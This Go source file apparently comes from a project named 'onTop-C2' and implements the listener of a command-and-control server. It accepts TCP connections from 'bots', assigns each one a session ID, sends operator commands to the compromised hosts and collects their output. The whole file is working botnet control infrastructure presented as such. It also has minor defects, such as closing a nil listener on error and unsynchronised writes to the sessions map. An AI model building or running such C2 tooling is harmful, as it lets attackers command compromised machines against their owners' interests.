package listener


import (
	// Built-in imports
	"fmt"
	"net"
	"sync"
	"bufio"
	"math/rand"
	// "strings"

	// Internal imports
	"github.com/Yyax13/onTop-C2/src/misc"

)

type ListenerSession struct {
	ID 			string
	BotIP		string
	Connection  net.Conn
	Commands 	chan string
	Outputs 	chan string

}

var Sessions = make(map[string]*ListenerSession)
func ipHandler(ip string, channel chan net.Conn) {
	misc.SysLog(fmt.Sprintf("Starting new handler for %v", ip), true)
	for conn := range channel {
		misc.SysLog(fmt.Sprintf("New connection from IP %v", ip), true)
		newSession := &ListenerSession{
			ID: fmt.Sprintf("bot-%d", rand.Intn(90000) + 10000),
			BotIP: ip,
			Connection: conn,
			Commands: make(chan string),
			Outputs: make(chan string),

		}
		
		Sessions[newSession.ID] = newSession
		misc.SysLog(fmt.Sprint("Session ID: ", newSession.ID, "\r\n"), true)

		go sessionHandler(newSession)

	}

}

func sessionHandler(sess *ListenerSession) {
	reader := bufio.NewReader(sess.Connection)
	writer := bufio.NewWriter(sess.Connection)
	
	go func() {
		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				misc.PanicWarn(fmt.Sprintf("Some error ocurred in session handler: %v", err), true)
				break

			}

			// if !strings.HasSuffix(line, fmt.Sprintf("%v__%v___", sess.ID, sess.BotIP)) || !strings.HasPrefix(line, "$") {
				sess.Outputs <- line

			// }

		}

	}()

	for commandByUser := range sess.Commands{
		_, err := writer.WriteString(commandByUser + "\n")
		if err != nil {
			break
		
		}
		
		writer.Flush()

	}

	

}

func StartListener(port int) {
	listener, err := net.Listen("tcp", fmt.Sprintf(":%d", port))
	if err != nil {
		misc.PanicWarn(fmt.Sprintf("Some error ocurred: %v", err.Error()), true)
		listener.Close()

	}

	defer listener.Close()
	misc.SysLog(fmt.Sprintf("Listening in the port %d...\r\n", port), true)

	ipClientChannel := make(map[string]chan net.Conn)
	var mu sync.Mutex

	for {
		conn, err := listener.Accept()
		if err != nil {
			misc.PanicWarn(fmt.Sprintln("Some error ocurred during connection:", err), true)
			continue

		}

		mu.Lock()
		connIP := misc.ScrapIP(conn.RemoteAddr().String())
		ch, alreadyExists := ipClientChannel[connIP]
		if !alreadyExists {
			ch = make(chan net.Conn, 100)
			ipClientChannel[connIP] = ch

			go ipHandler(connIP, ch)			

		}

		mu.Unlock()
		ch <- conn
		
	}

}
